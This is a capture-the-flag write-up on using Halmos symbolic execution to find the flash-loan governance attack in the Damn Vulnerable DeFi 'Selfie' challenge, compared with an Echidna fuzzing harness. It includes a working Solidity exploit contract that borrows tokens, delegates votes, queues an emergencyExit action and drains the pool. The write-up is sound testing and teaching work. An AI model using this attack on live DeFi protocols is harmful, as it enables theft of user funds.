# Halmos vs Selfie
## Halmos version
halmos 0.2.2.dev6+g27f620a was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **Selfie.t.sol** file to **SelfieHalmos.t.sol**.
2. Rename `test_selfie()` to `check_selfie()`, so Halmos will execute this test symbolically.
3. Avoid using `makeAddr()` cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(token), "DamnValuableVotes");
        glob.add_addr_name_pair(address(governance), "SimpleGovernance");
        glob.add_addr_name_pair(address(pool), "SelfiePool");
        ...
    ```
5. Print all contract addresses:
    ```solidity
    function check_selfie() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    console.log("GlobalStorage\t", address(glob));
    console.log("token\t\t", address(token));
    console.log("governance\t", address(governance));
    console.log("pool\t\t", address(pool));
    console.log("attacker\t\t", address(attacker));
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
    ...
    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] token         0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] governance    0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] pool          0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] attacker      0x00000000000000000000000000000000000000000000000000000000aaaa0006
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    // Player has taken all tokens from the pool
    assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
    assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
}
```
So, we are searching for some scenario to empty the pool by some amount:
```solidity
function _isSolved() private view {
    assert (token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
}
```
## Improvement of coverage
Let's run one symbolic transaction and carefully see if we can increase code coverage with trivial methods:
```solidity
function attack() public {
    execute_tx();
    //execute_tx();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3 -vvvvv
```
Among all reverted paths, we can highlight several that we can bypass in an obvious way.
### onFlashLoan
Consider these several paths:
```javascript
Path #67:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL SimpleGovernance::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #68:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL 0xaaaa0003::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```javascript
Path #72:
...
    CALL 0xaaaa0005::flashLoan(...)
    ...
        CALL GlobalStorage::onFlashLoan(...)
        ↩ REVERT 0x (error: Revert()) 
```
```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    ...
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }
    ...
}    
```
Here's what's going on: in `selfiePool::flashLoan()` we pass `_receiver` as a parameter. As we execute the transaction symbolically, Halmos starts brute-forcing all addresses known to it as a `_receiver`, trying to execute the `onFlashLoan()` function from each contract. We saw something similar in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/naive-receiver/README.md#optimizations). However, this time, we do not have a ready-made **IERC3156FlashBorrower** contract in the setup, so at the moment all `flashLoan` transactions are doomed to **revert**. But it's not scary, it's obvious that we can make such a callback inside our **SymbolicAttacker**, as we did in [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks):
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    address target = svm.createAddress("target_onFlashLoan");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call(data);
}
```
Plus, take into account that this `flashLoan` needs to be returned "honestly" this time. And should return a valid string:
```solidity
function flashLoan(...)
{
    ...
    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }
    ...
}
```
So, **SymbolicAttacker**:
```solidity
function onFlashLoan(...)
{
    ...
    DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1);
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}
```
And, indeed, we help the solver by assuming that the only `_receiver` can only be **SymbolicAttacker**:
```solidity
function flashLoan(...)
{
    vm.assume(address(_receiver) == address(0xaaaa0006)); // SymbolicAttacker
    ...
}
```
### executeAction
The next revert that deserves our attention is this:
```javascript
Path #46:
...
    CALL SimpleGovernance::executeAction(p_actionId_uint256_74c7dee_04())
    ↩ REVERT Concat(CannotExecute, p_actionId_uint256_74c7dee_04()) (error: Revert())
    ...
```
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }
    ...
}
...
function _canBeExecuted(uint256 actionId) private view returns (bool) {
    GovernanceAction memory actionToExecute = _actions[actionId];

    if (actionToExecute.proposedAt == 0) return false;

    uint64 timeDelta;
    unchecked {
        timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
    }

    return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
}
```
This revert is here because we never had any **action** registered. Since we could not symbolically enter here during 1 transaction, we assume that at least 2 are necessary: the first one registers the **action**, the second executes it. We also pay attention to the use of `block.timestamp`. This is a clear indication that some time should pass between transactions. We can't cover this code directly at this point, as we don't know the way to register an **action**. But we know for sure that one symbolic transaction will not be enough for us.

So our **SymbolicAttacker** becomes extended:
```solidity
function attack() public {
    execute_tx();
    uint256 warp = svm.createUint256("warp");
    vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
    execute_tx();
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
    halmos_selector_bytes4_0b23fde_25 = permit
    halmos_selector_bytes4_557bab0_51 = transferFrom
    ...
Killed
```
If we do not take into account the fake [permit-transferFrom](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/truster/README.md#counterexamples-analysis) counterexample we are familiar with, then the solution is still not found. Moreover, it did not even complete due to Out-of-memory. It is necessary to optimize!
### Small update
As of this writing, this behavior of Halmos has been [fixed](https://github.com/a16z/halmos/issues/425). Now the memory does not grow linearly with the growth of paths number, so we at least can finish 2 symbolic transactions in some time. However, a counterexample has still not been found, and such a test has been running for about 12 hours.
## Optimizations and heuristics
We have already met with path explosion limits in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations). And we can already highlight several directions of optimizations and heuristics that can be applied to bypass this limitation:
1. Add "solid" optimizations, which are known to have no effect on the result.
2. Add heuristics that can cut some scenarios, but don't reduce overall code coverage.
3. Simplify/change the invariant to make the engine's task easier.

Let's go through each of these points.
### Solid optimizations
The first thing I can think of here is to completely exclude `ERC20::permit` from symbolic function candidates, which is already starting to get annoying. I can't think of any scenario where we could apply it where `ERC20Votes::approve` is not applicable. A similar situation with `ERC20Votes::delegateBySig`. We have a simple `ERC20Votes::delegate` that we can apply in all the same scenarios.

So we will ban them by implementing a new functionality to exclude entire functions from symbolic calls coverage in GlobalStorage:
```solidity
contract GlobalStorage is Test, SymTest {
    constructor() {
        add_banned_function_selector(bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)")));
        add_banned_function_selector(bytes4(keccak256("delegateBySig(address,uint256,uint256,uint8,bytes32,bytes32)")));
    }
    ...
    mapping (uint256 => bytes4) banned_selectors;
    uint256 banned_selectors_size = 0;

    function add_banned_function_selector(bytes4 selector) public {
        banned_selectors[banned_selectors_size] = selector;
        banned_selectors_size++;
    }
    ...
    function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public 
                                        returns (address ret, bytes memory data) 
    {
    ...
        vm.assume(selector == bytes4(data));
        for (uint256 s = 0; s < banned_selectors_size; s++) {
            vm.assume(selector != banned_selectors[s]);
        }
        ...
    }
```
### Cut scenarios
Let's try to cut down the scenarios in which we symbolically enter the same function several times. Now we can't select the same function twice inside `get_concrete_from_symbolic` in the path. At the same time, the overall coverage of the code will not decrease, we will still go through all scenarios where these functions are entered once:
```solidity
contract GlobalStorage is Test, SymTest {
    ...
    mapping (uint256 => bytes4) used_selectors;
    uint256 used_selectors_size = 0;
    ...
    function get_concrete_from_symbolic_optimized (...) 
    {
        ...
        for (uint256 s = 0; s < used_selectors_size; s++) {
            vm.assume(selector != used_selectors[s]);
        }
        used_selectors[used_selectors_size] = selector;
        used_selectors_size++;
        ...
    }
    ...
}
```

Until now, we have expanded the number of symbolic attacking transactions only in 'attack()'. But actually this is not the only place where it is possible. Since processing 2 symbolic transactions directly from `attack()` is quite difficult for Halmos, we could try adding another symbolic transaction inside the 'onFlashLoan()' callback instead. This way we still process 2 symbolic transactions, but only if a **flashLoan** happened. This greatly reduces the number of scenarios we cover, which saves us a lot of resources:
```solidity
...
function execute_tx(string memory target_name) private {
        address target = svm.createAddress(target_name);
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic_optimized(target);
        target.call(data);
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        execute_tx("onFlashLoan_target1");
        execute_tx("onFlashLoan_target2");
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }
...
function attack() public {
    execute_tx("attack_target");
    /*uint256 warp = svm.createUint256("warp");
    vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
    execute_tx();*/
}
```
And for now, let's abandon the logic with warp, since in fact we have only one attacking symbolic transaction running, but let's keep in mind that it may be needed later.
### Invariants
Until now, we used only invariants that somehow followed from the initial conditions of the problem. I suggest this time to go a much more creative way and come up with any scenarios that seem unexpected, unnatural or buggy. Yes, let's do the work for the imaginary developers of these contracts and cover them with tests :D.

Let's start with token **allowance**. It is unexpected, that as a result of the **attacker's** actions, the **pool's** or **governance's** allowance may somehow change:
```solidity
function _isSolved() private view {
    ...
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(pool), symbolicSpender) == 0);
    assert (token.allowance(address(governance), symbolicSpender) == 0);
    ...
}
```
in **simpleGovernance** contract `_votingToken` is not immutable:
```solidity
contract SimpleGovernance is ISimpleGovernance {
    ...
    DamnValuableVotes private _votingToken;
    ...
}
```
Perhaps there is a scenario in which we can somehow change it:
```solidity
function _isSolved() private view {
    ...
    //check if governance's _votingToken may be changed
    assert (governance._votingToken() == token);
    ...
}
```
And what we have already talked about above. It is unexpected that there may be a scenario where an **attacker** can register some **action**:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    assert (governance._actionCounter() == 1);
    ...
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
halmos_attack_target_address_76088a0_01 = 0x00000000000000000000000000000000aaaa0005
halmos_onFlashLoan_target1_address_e2e23e2_11 = 0x00000000000000000000000000000000aaaa0003
halmos_onFlashLoan_target2_address_96959d6_37 = 0x00000000000000000000000000000000aaaa0004
halmos_onFlashLoan_warp_uint256_3e01f3b_36 = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe
halmos_selector_bytes4_1324286_10 = flashLoan
halmos_selector_bytes4_9ca1d33_35 = delegate
halmos_selector_bytes4_e371046_45 = queueAction
halmos_symbolicSpender_address_979144d_46 = 0x0000000000000000000000000000000000000000
p__amount_uint256_5941bda_07 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
p__data_length_a72e3db_09 = 0x0000000000000000000000000000000000000000000000000000000000000000
p__receiver_address_669827c_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p__token_address_46b250b_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
p_data_length_77de601_44 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_delegatee_address_e1aa274_16 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_target_address_188b5bf_41 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_value_uint128_14d3e47_42 = 0x0000000000000000000000000000000000000000000000000000000000000000
[FAIL] check_selfie() (paths: 7080, time: 948.98s, bounds: [])
```
Cool! We reduced the number of paths to ~7000 and found a scenario where an **attacker** can register an **action**: We borrow tokens through `flashLoan`, `delegate` them to ourselves, register an **action**, return the loan. In addition, we have "unlocked" the path to `executeAction`! And actually, we haven't needed warp here yet. That's good. 

But it is still not clear how to use this bug to empty the pool. Therefore, our journey continues.
## SymbolicAttacker preload
Now, before executing `attacker.attack()`, we will register some **action** using the bug we found in the previous section. But what **action** exactly? Let's make it symbolic and the solver will figure it out later.
```solidity
function check_selfie() public checkSolvedByPlayer {
    ...
    attacker.preload();
    uint256 warp = svm.createUint256("preattack_warp");
    vm.warp(block.timestamp + warp); // wait for symbolic time between transactions
    attacker.attack();
}
```
```solidity
function onFlashLoan(address initiator, address token,
                    uint256 amount, uint256 fee,
                    bytes calldata data
) external returns (bytes32) 
{
    if (is_preload) {
        DamnValuableVotes(token).delegate(address(this));
        SimpleGovernance governance = SimpleGovernance(address(0xaaaa0004));
        address target = svm.createAddress("preload_onFlashLoan_target");
        uint256 value = svm.createUint256("preload_onFlashLoan_value");
        bytes memory data = svm.createBytes(1000, "preload_onFlashLoan_data");
        governance.queueAction(target, uint128(value), data);
    }
    else {
        execute_tx("onFlashLoan_target");
    }
    DamnValuableVotes(token).approve(address(msg.sender), type(uint256).max); // unlimited approve for pool
    return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
}

function preload(SelfiePool pool, DamnValuableVotes token) public {
    is_preload = true;
    bytes memory data = svm.createBytes(1000, "preload_data");
    uint256 amount = svm.createUint256("preload_amount");
    pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    is_preload = false;
}
...
```
We do not forget to remove assert for the constancy of `_actionCounter`, otherwise every path will be a counterexample:
```solidity
function _isSolved() private view {
    ...
    // Check number of registered actions
    //assert (governance._actionCounter() == 1);
}
```
Since we unlocked the `executeAction` function, let's start again with one symbolic transaction. Will see if that's enough.

Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
WARNING  Encountered symbolic memory offset: 320 + Concat(...)
...
```
The problem here is:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
...
GovernanceAction storage actionToExecute = _actions[actionId];
...
```
Obviously, we have only one action. Feel free to use `assume`:
```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    vm.assume(actionId == 1);
    ...
```
Also at this point we have recursion, as some function from **SymbolicAttacker** can be launched as a target.
We remove such a scenario:
```solidity
vm.assume(actionToExecute.target != address(0xaaaa0006));
return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
```
Run again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_selfie --loop 3
...
Counterexample:
    halmos_attack_target_address_ba23df8_07 = 0x00000000000000000000000000000000aaaa0004
    halmos_preattack_warp_uint256_072067d_06 = 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    halmos_preload_amount_uint256_187eee1_02 = 0x00000000000000000000000000000000000000000000ffe33bfeffedf1800001
    halmos_preload_onFlashLoan_data_bytes_a4fe5da_05 = 0xa441d06700000000000000000000000000000000000000000000000000000000aaaa000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    halmos_preload_onFlashLoan_target_address_1ccd7a9_03 = 0x00000000000000000000000000000000aaaa0005
    halmos_preload_onFlashLoan_value_uint256_251117f_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_selector_bytes4_b526f44_15 = executeAction
    p_actionId_uint256_b6a16cb_10 = 0x0000000000000000000000000000000000000000000000000000000000000001     
```
This time it's a little hard to follow what happened, since we added a preload stage, but it's generally clear: our **action** executes `emergencyExit` from the **pool**, thereby emptying it. Attack scenario found!
## Using a counterexample
**Attacker**:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {Test, console} from "forge-std/Test.sol";

contract Attacker {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        DamnValuableVotes(token).delegate(address(this));
        address target = address(pool);
        uint128 value = 0;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(target, value, data);
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function preload() public {
        bytes memory data = "";
        uint256 amount = 0xffe33bfeffedf1800001;
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function attack() public {
        governance.executeAction(1);
    }
}
```
Test:
```solidity
function test_selfie() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(token, governance, pool, recovery);
    attacker.preload();
    vm.warp(block.timestamp + 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
    attacker.attack();
}
```
Run:
```javascript
$ forge test --mp test/selfie/Selfie.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.95ms (1.46ms CPU time)
```
Success!
## Fuzzing vs Selfie
I'm very happy that I don't have to prepare this challenge contracts for fuzzing testing. The **Crytic team** already has a ready-made solution to this problem (Damn Vulnerable Defi V3) using Echidna [here](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/selfie/EchidnaSelfie.sol). Before a detailed analysis of their solutions, looking ahead, I want to say that this is currently the most vivid example of the difference in approaches to the preparation of contracts in Halmos and Echidna in the case of such non-trivial attacks. And I am really impressed with the work done here. The fact that they did make Echidna work here deserves respect!
### Version differences
in DVD V3 and V4, the very essence of the challenge remained the same, with the same bug. However, there are some differences in key function names and token logic:
1. In V3, the `emergencyExit` function is called `drainAllFunds`.
2. The `onFlashLoan` function is called `receiveTokens`.
3. Logic via `snapshot` is used instead of `ERC20Votes::delegate`.

### Idea overview
To describe the idea briefly: we have a "monstrous" [push-use](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/the-rewarder/README.md#analysis-of-the-limits-of-echidna) pattern, where a small number of functions that can be called by an attacker are described directly in the code without any abstractions. The first few calls are to "setup" the functions that will then be called by the attacking transaction.
### Reduced number of scenarios
As with Halmos solution, the Echidna-based solution has reduced the number of covered scenarios. But there is a key important difference: basically, they only consider these target functions:
```solidity
enum CallbackActions {
    drainAllFunds,
    transferFrom,
    queueAction,
    executeAction
}
```
In the same time, during the optimizations when working in Halmos, we did not cut out the entire functions that we have to cover. 

I understand why they don't check, for example, `ERC20::transfer`. Otherwise, the code would be even more bloated. More on that a little later. Nevertheless, in my opinion, this is already a very big hint for a fuzzer.
### setup
So, let's find out how Echidna decides which functions will be run in the `receiveTokens` callback.

We have an array where the identifiers of these functions are written:
```solidity
uint256[] private callbackActionsToBeCalled;
```
And there are 4 functions that essentially push IDs into this array:
```solidity
...
function pushDrainAllFundsToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.drainAllFunds));
}
...
function pushTransferFromToCallback(uint256 _amount) external {
    require(_amount > 0, "Cannot transfer zero tokens");
    _transferAmountInCallback.push(_amount);
    callbackActionsToBeCalled.push(uint256(CallbackActions.transferFrom));
}
...
function pushQueueActionToCallback(
    uint256 _weiAmount,
    uint256 _payloadNum,
    uint256 _amountToTransfer
) external {
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        require(_amountToTransfer > 0, "Cannot transfer 0 tokens");
    }
    // add the action into the callback array
    callbackActionsToBeCalled.push(uint256(CallbackActions.queueAction));
    // update payloads mapping
    payloads[payloadsPushedCounter].weiAmount = _weiAmount;
    // create payload
    createPayload(_payloadNum, _amountToTransfer);
}
...
function pushExecuteActionToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.executeAction));
}
```
Here it is also worth describing the `createPayload` function, which is performed as part of the `queueAction` push. Since we already know that Echidna is not good at running functions that are passed as target and calldata, we have to work around it somehow:
```solidity
// to store data related to the given payload created by Echidna
struct QueueActionPayload {
    uint256 payloadIdentifier; // createPayload -> logging purposes
    bytes payload; // createPayload
    address receiver; // createPayload
    uint256 weiAmount; // pushQueueActionToCallback
    uint256 transferAmount; // createPayload -> used only if payloadIdentifier == uint256(PayloadTypesInQueueAction.transferFrom)
}
// internal counter of payloads created
mapping(uint256 => QueueActionPayload) payloads;
...
function createPayload(
    uint256 _payloadNum,
    uint256 _amountToTransfer
) internal {
    // optimization: to create only valid payloads, narrowing down the _payloadNum
    _payloadNum = _payloadNum % payloadsLength;
    // cache counter of already pushed payloads to the payload mapping
    uint256 _counter = payloadsPushedCounter;
    // store payload identifier
    payloads[_counter].payloadIdentifier = _payloadNum;
    // initialize payload variables
    bytes memory _payload;
    address _receiver;
    // either create a payload of drainAllFunds funtion if selected
    if (_payloadNum == uint256(PayloadTypesInQueueAction.drainAllFunds)) {
        _payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        _receiver = address(pool);
    }
    // or create a payload of transferFrom function if selected
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        // _transferAmountInPayload.push(_amountToTransfer);
        _payload = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            address(pool),
            address(this),
            _amountToTransfer
        );
        _receiver = address(token);
        // store amount to transfer
        payloads[_counter].transferAmount = _amountToTransfer;
    }
    // fill payload mapping by the variables created
    payloads[_counter].payload = _payload;
    payloads[_counter].receiver = _receiver;
    // increase payload counter (for the next iteration of new payload creation)
    ++payloadsPushedCounter;
}
```
A bit like our Frankenstein from [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna), isn't it? Again, I draw your attention to the fact that only 2 functions that can be launched inside `executeAction` are considered here, and the function is already so huge. And the parameters of these functions are not abstract, but hard-coded. Against this background, the usability of Halmos is obvious.
### Call actions
After the setup is complete, the fuzzer has the ability to run all these functions. 
`receiveTokens` has functionality for this:
```solidity
...
 function receiveTokens(address, uint256 _amount) external {
    require(
        msg.sender == address(pool),
        "Only SelfiePool can call this function."
    );
    // logic
    callbackActions();
    // repay the loan
    require(token.transfer(address(pool), _amount), "Flash loan failed");
}
...
function callbackActions() internal {
    uint256 genArrLength = callbackActionsToBeCalled.length;
    if (genArrLength != 0) {
        for (uint256 i; i < genArrLength; i++) {
            callAction(callbackActionsToBeCalled[i]);
        }
    } else {
        revert("actionsToBeCalled is empty, no action called");
    }
}
...
function callAction(uint256 _num) internal {
    // drain all funds
    if (_num == uint256(CallbackActions.drainAllFunds)) {
        drainAllFunds();
    }
    // transfer funds
    if (_num == uint256(CallbackActions.transferFrom)) {
        callbackTransferFrom();
    }
    // queue an action
    if (_num == uint256(CallbackActions.queueAction)) {
        callQueueAction();
        ++payloadsQueuedCounter;
    }
    // execute an action
    if (_num == uint256(CallbackActions.executeAction)) {
        try this.executeAction() {} catch {
            revert("queueAction unsuccessful");
        }
    }
}
```
And, actually, functions that are launched inside `callAction`.
```solidity
...
function drainAllFunds() public {
    pool.drainAllFunds(address(this));
}
...
function callbackTransferFrom() internal {
    // get the amount of tokens to be transfered
    uint256 _amount = _transferAmountInCallback[
        _transferAmountInCallbackCounter
    ];
    // increase the counter
    ++_transferAmountInCallbackCounter;
    // call the transfer function
    transferFrom(_amount);
}
...
function callQueueAction() internal {
    // cache the current value of counter of already queued actions
    uint256 counter = payloadsQueuedCounter;
    // get queueAction parameters (for more details see SimpleGovernance:SimpleGovernance) based on the current counter
    // 1: weiAmount
    uint256 _weiAmount = payloads[counter].weiAmount;
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    // 2: receiver address
    address _receiver = payloads[counter].receiver;
    // 3: payload
    bytes memory _payload = payloads[counter].payload;
    // call the queueAction()
    queueAction(_receiver, _payload, _weiAmount);
}
...
function executeAction() public {
    // get the first unexecuted actionId
    uint256 actionId = actionIds[actionIdCounter];
    // increase action Id counter
    actionIdCounter = actionIdCounter + 1;
    // get data related to the action to be executed
    (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
        actionId
    );
    require(
        address(this).balance >= weiAmount,
        "Not sufficient account balance to execute the action"
    );
    require(
        block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
        "Time for action execution has not passed yet"
    );
    // Action
    governance.executeAction{value: weiAmount}(actionId);
    // increase counter of payloads executed
    ++payloadsExecutedCounter;
}
```
Running the `flashLoan` and `executeAction` happen here:
```solidity
...
function flashLoan() public {
    // borrow max amount of tokens
    uint256 borrowAmount = token.balanceOf(address(pool));
    pool.flashLoan(borrowAmount);
}
...
function executeAction() public {
    // get the first unexecuted actionId
    uint256 actionId = actionIds[actionIdCounter];
    // increase action Id counter
    actionIdCounter = actionIdCounter + 1;
    // get data related to the action to be executed
    (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
        actionId
    );
    require(
        address(this).balance >= weiAmount,
        "Not sufficient account balance to execute the action"
    );
    require(
        block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
        "Time for action execution has not passed yet"
    );
    // Action
    governance.executeAction{value: weiAmount}(actionId);
    // increase counter of payloads executed
    ++payloadsExecutedCounter;
}
```

As a result, Echidna must find such a set of setup functions in which the invariant is broken when the attack is launched.

I missed some details, but I would recommend you read the full solution by yourself.
## Conclusions
1. Optimization and heuristics will be an integral part of preparing sufficiently complex contracts for symbolic testing. There is no escaping this and you need to gain experience in their correct application.
2. You can expand the number of symbolic transactions not only in the **SymbolicAttacker** entry point, but also in symbolic callbacks. This may save us resources.
3. If we are looking for an attack - sometimes you can find a bug by not looking for a direct counterexample, but simply by finding **SOMETHING UNEXPECTED**. It is not possible to come up with some clear algorithm here, only it is possible to advise the studying of the business logic of the contract and make new invariants based on this.
4. The comparison of fuzzing and symbolic analysis approaches based on this challenge has most clearly shown the advantage of Halmos when testing contracts with a high level of logic abstraction. The fuzzing preparation looks like a big overengineering, while the symbolic execution preparation is certainly not as easy as we're used to, but still pretty straightforward.
